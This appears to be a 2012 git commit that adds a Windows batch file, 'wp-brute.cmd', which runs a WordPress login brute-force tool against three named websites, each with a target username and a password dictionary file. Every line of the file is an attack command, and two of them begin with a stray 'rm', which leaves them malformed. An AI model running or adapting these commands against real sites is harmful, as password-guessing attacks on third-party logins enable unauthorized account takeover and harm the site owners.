91e3347acd8ebb677dad4d65c6e388bc13bd312c
Xekep <kidlok@bk.ru>
2012-12-19 22:35:29 +0500

    Release

---
+++ wp-brute.cmd
@@ -0,0 +1,3 @@
+start wp-brute.EXE -h phuket.thairent.ru -l Komissar -d dic.txt
+rm start wp-brute.EXE -h www.terraria-world.ru -l admin -d dic.txt
+rm start wp-brute.EXE -h www.soft.zone66.su -l xekep -d dic2.txt
